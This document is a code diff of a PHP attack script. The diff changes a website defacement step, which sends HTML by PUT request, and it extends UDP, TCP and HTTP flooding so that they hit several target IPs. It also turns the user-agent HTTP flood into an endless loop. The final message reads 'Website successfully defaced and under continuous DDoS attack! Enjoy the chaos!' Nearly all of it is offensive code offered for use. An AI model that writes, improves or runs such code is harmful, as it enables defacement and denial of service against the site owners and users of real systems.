@@ -21,7 +21,7 @@ curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
 curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "PUT");
 curl_setopt($ch, CURLOPT_POSTFIELDS, $defaceHtml);
-curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.7.1000 Chrome/30.0.1599.101 Safari/537.36"); 
+curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36"); 
 $response = curl_exec($ch);
 curl_close($ch);
 
@@ -51,12 +51,14 @@ foreach ($targetIps as $targetIp) {
 }
 
 // UDP Flood Attack
-$udpTargetIp = "127.0.0.1"; // Replace with the IP address of the target server
-$udpTargetPort = 53; // Replace with the port of the target server
+$udpTargetIps = array("127.0.0.1", "192.168.1.1"); // Replace with the IP addresses of the target servers
+$udpTargetPort = 53; // Replace with the port of the target servers
 
-for ($i = 0; $i < 100; $i++) {
-    $packet = new UdpPacket($udpTargetIp, $udpTargetPort);
-    $packet->send();
+foreach ($udpTargetIps as $udpTargetIp) {
+    for ($i = 0; $i < 100; $i++) {
+        $packet = new UdpPacket($udpTargetIp, $udpTargetPort);
+        $packet->send();
+    }
 }
 
 // SSL/TLS Attack
@@ -76,12 +78,14 @@ for ($i = 0; $i < 100; $i++) {
 }
 
 // TCP Attacks
-$targetIp = "127.0.0.1"; // Replace with the IP address of the target server
-$targetPort = 80; // Replace with the port of the target server
+$targetIps = array("127.0.0.1", "192.168.1.1"); // Replace with the IP addresses of the target servers
+$targetPort = 80; // Replace with the port of the target servers
 
-for ($i = 0; $i < 100; $i++) {
-    $packet = new TcpPacket($targetIp, $targetPort);
-    $packet->send();
+foreach ($targetIps as $targetIp) {
+    for ($i = 0; $i < 100; $i++) {
+        $packet = new TcpPacket($targetIp, $targetPort);
+        $packet->send();
+    }
 }
 
 // Legitimate Useragents Bot Attacks
@@ -95,7 +99,7 @@ $useragents = array(
 
 $targetUrl = "http://example.com"; // Replace with the URL of the target server
 
-for ($i = 0; $i < 100; $i++) {
+while (true) {
     $useragent = $useragents[array_rand($useragents)];
     $ch = curl_init();
     curl_setopt($ch, CURLOPT_URL, $targetUrl);
@@ -106,7 +110,7 @@ for ($i = 0; $i < 100; $i++) {
     curl_close($ch);
 }
 
-echo "Website successfully defaced and under DDoS attack! Enjoy the chaos!";
+echo "Website successfully defaced and under continuous DDoS attack! Enjoy the chaos!";
 
 class SynPacket
 }
